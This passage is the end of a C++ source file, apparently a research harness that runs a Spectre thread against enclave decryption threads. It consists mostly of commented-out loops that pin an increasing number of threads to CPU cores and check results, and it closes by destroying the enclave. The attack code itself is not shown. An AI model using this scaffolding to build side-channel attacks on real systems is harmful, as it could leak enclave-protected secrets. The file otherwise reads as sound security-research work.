	// 	std::thread th_7(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_7, 7);  // Thread 7 -> Core 7
	// 	std::thread th_2(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_2, 2);  // Thread 2 -> Core 2
	// 	std::thread th_8(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_8, 8);  // Thread 8 -> Core 8
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_6.join();
	// 	th_1.join();
	// 	th_7.join();
	// 	th_2.join();
	// 	th_8.join();
	// 	checkResult(i, 5);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_6(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_6, 6);  // Thread 6 -> Core 6
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_7(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_7, 7);  // Thread 7 -> Core 7
	// 	std::thread th_2(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_2, 2);  // Thread 2 -> Core 2
	// 	std::thread th_8(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_8, 8);  // Thread 8 -> Core 8
	// 	std::thread th_3(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_3, 3);  // Thread 3 -> Core 3
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_6.join();
	// 	th_1.join();
	// 	th_7.join();
	// 	th_2.join();
	// 	th_8.join();
	// 	th_3.join();
	// 	checkResult(i, 6);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_6(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_6, 6);  // Thread 6 -> Core 6
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_7(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_7, 7);  // Thread 7 -> Core 7
	// 	std::thread th_2(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_2, 2);  // Thread 2 -> Core 2
	// 	std::thread th_8(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_8, 8);  // Thread 8 -> Core 8
	// 	std::thread th_3(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_3, 3);  // Thread 3 -> Core 3
	// 	std::thread th_9(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_9, 9);  // Thread 9 -> Core 9
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_6.join();
	// 	th_1.join();
	// 	th_7.join();
	// 	th_2.join();
	// 	th_8.join();
	// 	th_3.join();
	// 	th_9.join();
	// 	checkResult(i, 7);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_6(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_6, 6);  // Thread 6 -> Core 6
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_7(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_7, 7);  // Thread 7 -> Core 7
	// 	std::thread th_2(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_2, 2);  // Thread 2 -> Core 2
	// 	std::thread th_8(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_8, 8);  // Thread 8 -> Core 8
	// 	std::thread th_3(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_3, 3);  // Thread 3 -> Core 3
	// 	std::thread th_9(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_9, 9);  // Thread 9 -> Core 9
	// 	std::thread th_4(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_4, 4);  // Thread 4 -> Core 4
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_6.join();
	// 	th_1.join();
	// 	th_7.join();
	// 	th_2.join();
	// 	th_8.join();
	// 	th_3.join();
	// 	th_9.join();
	// 	th_4.join();
	// 	checkResult(i, 8);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_6(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_6, 6);  // Thread 6 -> Core 6
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_7(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_7, 7);  // Thread 7 -> Core 7
	// 	std::thread th_2(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_2, 2);  // Thread 2 -> Core 2
	// 	std::thread th_8(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_8, 8);  // Thread 8 -> Core 8
	// 	std::thread th_3(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_3, 3);  // Thread 3 -> Core 3
	// 	std::thread th_9(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_9, 9);  // Thread 9 -> Core 9
	// 	std::thread th_4(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_4, 4);  // Thread 4 -> Core 4
	// 	std::thread th_10(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_10, 10);  // Thread 10 -> Core 10
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_6.join();
	// 	th_1.join();
	// 	th_7.join();
	// 	th_2.join();
	// 	th_8.join();
	// 	th_3.join();
	// 	th_9.join();
	// 	th_4.join();
	// 	th_10.join();
	// 	checkResult(i, 9);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_6(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_6, 6);  // Thread 6 -> Core 6
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_7(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_7, 7);  // Thread 7 -> Core 7
	// 	std::thread th_2(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_2, 2);  // Thread 2 -> Core 2
	// 	std::thread th_8(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_8, 8);  // Thread 8 -> Core 8
	// 	std::thread th_3(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_3, 3);  // Thread 3 -> Core 3
	// 	std::thread th_9(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_9, 9);  // Thread 9 -> Core 9
	// 	std::thread th_4(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_4, 4);  // Thread 4 -> Core 4
	// 	std::thread th_10(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_10, 10);  // Thread 10 -> Core 10
	// 	std::thread th_5(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_5, 5);  // Thread 5 -> Core 5
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_6.join();
	// 	th_1.join();
	// 	th_7.join();
	// 	th_2.join();
	// 	th_8.join();
	// 	th_3.join();
	// 	th_9.join();
	// 	th_4.join();
	// 	th_10.join();
	// 	th_5.join();
	// 	checkResult(i, 10);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_6(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_6, 6);  // Thread 6 -> Core 6
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_7(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_7, 7);  // Thread 7 -> Core 7
	// 	std::thread th_2(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_2, 2);  // Thread 2 -> Core 2
	// 	std::thread th_8(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_8, 8);  // Thread 8 -> Core 8
	// 	std::thread th_3(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_3, 3);  // Thread 3 -> Core 3
	// 	std::thread th_9(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_9, 9);  // Thread 9 -> Core 9
	// 	std::thread th_4(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_4, 4);  // Thread 4 -> Core 4
	// 	std::thread th_10(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_10, 10);  // Thread 10 -> Core 10
	// 	std::thread th_5(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_5, 5);  // Thread 5 -> Core 5
	// 	std::thread th_11(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_11, 11);  // Thread 11 -> Core 11
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_6.join();
	// 	th_1.join();
	// 	th_7.join();
	// 	th_2.join();
	// 	th_8.join();
	// 	th_3.join();
	// 	th_9.join();
	// 	th_4.join();
	// 	th_10.join();
	// 	th_5.join();
	// 	th_11.join();
	// 	checkResult(i, 11);
	// }

    /* Destroy the enclave */
	destroy_enclave();

    return 0;
};

